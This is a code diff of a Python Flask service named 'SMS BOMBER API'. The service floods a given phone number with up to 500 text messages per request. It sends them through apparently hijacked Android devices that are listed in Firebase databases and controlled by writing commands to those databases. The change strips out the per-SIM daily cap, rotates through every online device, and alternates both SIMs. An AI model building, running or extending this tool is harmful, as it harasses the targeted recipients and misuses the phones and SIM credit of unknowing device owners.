@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-SMS BOMBER API - Render.com Deployment
-NO API KEY REQUIRED - Just number, msg, count
+SMS BOMBER API - 100 REQUESTS = 100 DEVICES × BOTH SIMS
+NO LIMIT - Har device ke dono SIM use honge
 Developer: @noobsater
 """
 
@@ -18,7 +18,7 @@ import os
 app = Flask(__name__)
 
 # ============================================================
-# ===== ALL FIREBASE CONFIGURATIONS (127+) =====
+# ===== ALL FIREBASE CONFIGURATIONS =====
 # ============================================================
 
 FIREBASE_CONFIGS = [
@@ -163,8 +163,8 @@ FIREBASE_CONFIGS = [
 # ===== CONFIGURATION =====
 # ============================================================
 
-MAX_SMS_PER_SIM = 100
-device_usage = {}
+# NO LIMIT - Sab devices use honge
+device_index = 0
 
 # ============================================================
 
@@ -181,18 +181,19 @@ def safe_int(value):
             return 0
     return 0
 
-def get_today():
-    return datetime.now().strftime("%Y-%m-%d")
-
-def can_send(device_id, sim):
-    key = f"{device_id}_sim{sim}_{get_today()}"
-    return device_usage.get(key, 0) < MAX_SMS_PER_SIM
-
-def increment_usage(device_id, sim):
-    key = f"{device_id}_sim{sim}_{get_today()}"
-    device_usage[key] = device_usage.get(key, 0) + 1
+def is_online(info):
+    """Check if device is online"""
+    if info.get('status') == True:
+        return True
+    battery = info.get('battery')
+    if battery:
+        batt_int = safe_int(battery)
+        if batt_int > 0:
+            return True
+    return False
 
 def fetch_devices(config):
+    """Fetch ONLY online devices"""
     url = f"{config['url']}/clients.json?auth={config['auth']}"
     try:
         response = requests.get(url, timeout=10)
@@ -203,8 +204,7 @@ def fetch_devices(config):
             return []
         devices = []
         for client_id, info in data.items():
-            is_online = info.get('status') == True or safe_int(info.get('battery')) > 0
-            if is_online:
+            if is_online(info):
                 devices.append({
                     "id": client_id,
                     "firebase": config['name'],
@@ -219,6 +219,7 @@ def fetch_all_devices():
     for config in FIREBASE_CONFIGS:
         devices = fetch_devices(config)
         all_devices.extend(devices)
+    random.shuffle(all_devices)
     return all_devices
 
 def send_sms(config, client_id, to_number, message, sim=1):
@@ -232,7 +233,6 @@ def send_sms(config, client_id, to_number, message, sim=1):
     try:
         response = requests.put(url, json=payload, timeout=10)
         if response.status_code in [200, 201, 204]:
-            increment_usage(client_id, sim)
             return True
         return False
     except:
@@ -246,7 +246,8 @@ def send_sms(config, client_id, to_number, message, sim=1):
 def home():
     return f"""
 ╔═══════════════════════════════════════════════════════════╗
-║     🔥 SMS BOMBER API - {len(FIREBASE_CONFIGS)} FIREBASE DBs    ║
+║     🔥 SMS BOMBER API - ONLINE DEVICES ONLY            ║
+║     100 REQUESTS = 100 DEVICES × BOTH SIMs             ║
 ╠═══════════════════════════════════════════════════════════╣
 ║                                                         ║
 ║  📌 USAGE:                                             ║
@@ -255,12 +256,10 @@ def home():
 ║                                                         ║
 ║  📊 FEATURES:                                          ║
 ║                                                         ║
-║  ✅ {len(FIREBASE_CONFIGS)} Firebase Databases           ║
-║  ✅ ONLINE devices only                                ║
-║  ✅ Dual SIM (1 & 2)                                  ║
-║  ✅ {MAX_SMS_PER_SIM} SMS per SIM per day              ║
-║  ✅ Auto-rotate devices                                ║
-║  ✅ NO API KEY required                                ║
+║  ✅ ONLINE devices only                               ║
+║  ✅ Each request = NEW device                         ║
+║  ✅ Both SIMs (1 & 2) per device                     ║
+║  ✅ NO LIMIT - exhausted SIMs bhi use honge          ║
 ║                                                         ║
 ╠═══════════════════════════════════════════════════════════╣
 ║  👨‍💻 Developer: @noobsater                              ║
@@ -275,16 +274,16 @@ def status_api():
     return jsonify({
         "success": True,
         "timestamp": datetime.now().isoformat(),
-        "total_online_devices": len(all_devices),
+        "online_devices": len(all_devices),
         "firebases": len(FIREBASE_CONFIGS),
-        "limit_per_sim": MAX_SMS_PER_SIM,
-        "device_usage": device_usage,
         "developer": "@noobsater",
         "channel": "t.me/noob11001"
     })
 
 @app.route('/send')
 def send_sms_api():
+    global device_index
+    
     number = request.args.get('number')
     message = request.args.get('msg')
     count = int(request.args.get('count') or 1)
@@ -293,6 +292,8 @@ def send_sms_api():
         return jsonify({"success": False, "error": "Number and message required!"}), 400
     
     max_count = min(count, 500)
+    
+    # Fetch ONLINE devices only
     all_devices = fetch_all_devices()
     
     if not all_devices:
@@ -302,42 +303,31 @@ def send_sms_api():
             "firebases": len(FIREBASE_CONFIGS)
         }), 404
     
-    tasks = []
-    for device in all_devices:
-        for sim in [1, 2]:
-            if can_send(device['id'], sim):
-                tasks.append({"device": device, "sim": sim})
-    
-    if not tasks:
-        return jsonify({
-            "success": False,
-            "error": "All SIMs exhausted! Limit: 100 per SIM per day",
-            "limit": MAX_SMS_PER_SIM,
-            "total_online_devices": len(all_devices)
-        }), 429
-    
-    random.shuffle(tasks)
-    tasks = tasks[:max_count]
-    
     sent, failed = 0, 0
-    sim_stats = {"sim1": 0, "sim2": 0}
+    devices_used = []
     
-    def worker(task):
-        device = task["device"]
-        sim = task["sim"]
+    # ===== ONE DEVICE PER SMS, BOTH SIMs =====
+    for i in range(max_count):
+        # Rotate device
+        device_index = (device_index + 1) % len(all_devices)
+        device = all_devices[device_index]
+        
+        # Alternating SIMs: 1, 2, 1, 2, ...
+        sim = 1 if (i % 2 == 0) else 2
+        
         success = send_sms(device['config'], device['id'], number, message, sim)
-        return success, sim
-    
-    with ThreadPoolExecutor(max_workers=5) as ex:
-        for success, sim in ex.map(worker, tasks):
-            if success:
-                sent += 1
-                if sim == 1:
-                    sim_stats["sim1"] += 1
-                else:
-                    sim_stats["sim2"] += 1
-            else:
-                failed += 1
+        
+        if success:
+            sent += 1
+            devices_used.append({
+                "device": device['id'][:8],
+                "sim": sim,
+                "firebase": device['firebase']
+            })
+        else:
+            failed += 1
+        
+        time.sleep(0.1)
     
     return jsonify({
         "success": sent > 0,
@@ -346,9 +336,8 @@ def send_sms_api():
         "requested": max_count,
         "sent": sent,
         "failed": failed,
-        "total_online_devices": len(all_devices),
-        "sim_stats": sim_stats,
-        "limit_per_sim": MAX_SMS_PER_SIM,
+        "devices_used": devices_used,
+        "online_devices": len(all_devices),
         "firebases": len(FIREBASE_CONFIGS),
         "developer": "@noobsater",
         "channel": "t.me/noob11001",
@@ -357,11 +346,11 @@ def send_sms_api():
 
 @app.route('/reset')
 def reset_api():
-    global device_usage
-    device_usage = {}
+    global device_index
+    device_index = 0
     return jsonify({
         "success": True,
-        "message": "Device usage reset successfully!",
+        "message": "Device index reset successfully!",
         "developer": "@noobsater"
     })
 
@@ -370,8 +359,8 @@ def debug_api():
     all_devices = fetch_all_devices()
     return jsonify({
         "success": True,
-        "total": len(all_devices),
-        "devices": all_devices[:20],
+        "online_devices": len(all_devices),
+        "sample_devices": all_devices[:20],
         "firebases": len(FIREBASE_CONFIGS)
     })
 
